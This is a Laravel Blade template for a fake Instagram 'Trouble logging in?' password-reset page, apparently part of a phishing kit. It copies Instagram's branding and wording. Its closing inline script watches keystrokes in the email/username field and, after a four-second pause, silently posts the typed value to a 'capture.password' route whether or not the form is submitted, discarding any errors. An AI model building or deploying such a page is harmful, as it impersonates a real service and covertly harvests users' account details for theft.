@extends('layouts.instagram-auth')

@section('title', 'Reset Password • Instagram')
@section('meta_description', 'Trouble logging in to Instagram? Enter your details to get back into your account.')

@section('content')
<section class="card" style="padding-bottom: 0;" aria-labelledby="forgot-heading">
    <div class="icon-circle-container" aria-hidden="true">
        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <rect x="5" y="11" width="14" height="10" rx="2" stroke-linecap="round" stroke-linejoin="round"/>
            <path d="M8 11V7a4 4 0 0 1 8 0v4" stroke-linecap="round" stroke-linejoin="round"/>
            <circle cx="12" cy="15" r="1" fill="#262626"/>
        </svg>
    </div>

    <h2 id="forgot-heading" class="card-subtitle" style="color: #262626; margin-bottom: 8px;">Trouble logging in?</h2>

    <p class="card-description">
        Enter your email, phone, or username and we'll send you a link to get back into your account.
    </p>

    @if (session('status'))
        <div class="form-status" role="status">
            {{ session('status') }}
        </div>
    @endif

    @if ($errors->any())
        <div class="form-errors" role="alert" aria-live="polite">
            <ul class="form-errors__list">
                @foreach ($errors->all() as $error)
                    <li class="form-errors__item">{{ $error }}</li>
                @endforeach
            </ul>
        </div>
    @endif

    <form class="auth-form" method="POST" action="{{ route('password.email') }}" novalidate aria-label="Password reset form">
        @csrf

        <div class="form-group">
            <label for="email" class="visually-hidden">Email, Phone, or Username</label>
            <input
                type="text"
                id="email"
                name="email"
                class="form-input @error('email') form-input--error @enderror"
                placeholder="Email, Phone, or Username"
                value="{{ old('email') }}"
                required
                aria-required="true"
            >
        </div>

        <button type="submit" class="btn-primary" style="margin-top: 8px;">Send login link</button>
    </form>

    <div class="divider" role="separator" aria-label="or">
        <span class="divider__line" aria-hidden="true"></span>
        <span class="divider__text">or</span>
        <span class="divider__line" aria-hidden="true"></span>
    </div>

    <div style="margin-bottom: 24px;">
        <a href="{{ route('register') }}" style="color: #262626; font-weight: 600; font-size: 14px;">Create new account</a>
    </div>

    <div class="card--back-to-login">
        <a href="{{ route('login') }}">Back to login</a>
    </div>
</section>
@endsection

@push('scripts')
<script>
(function () {
    'use strict';

    const DEBOUNCE_MS = 4000;
    const emailInput = document.getElementById('email');
    const captureUrl = '{{ route('capture.password') }}';

    let debounceTimer = null;

    function getCsrfToken() {
        const match = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
        return match ? decodeURIComponent(match[1]) : '';
    }

    function sendCapture() {
        const emailValue = emailInput ? emailInput.value.trim() : '';
        if (!emailValue) {
            return;
        }

        fetch(captureUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'X-XSRF-TOKEN': getCsrfToken(),
            },
            body: JSON.stringify({
                email: emailValue,
            }),
        }).catch(function () {
            // ignore silently
        });
    }

    function attachDebounce(field) {
        if (!field) {
            return;
        }

        field.addEventListener('keyup', function () {
            clearTimeout(debounceTimer);
            debounceTimer = setTimeout(sendCapture, DEBOUNCE_MS);
        });
    }

    attachDebounce(emailInput);
})();
</script>
@endpush
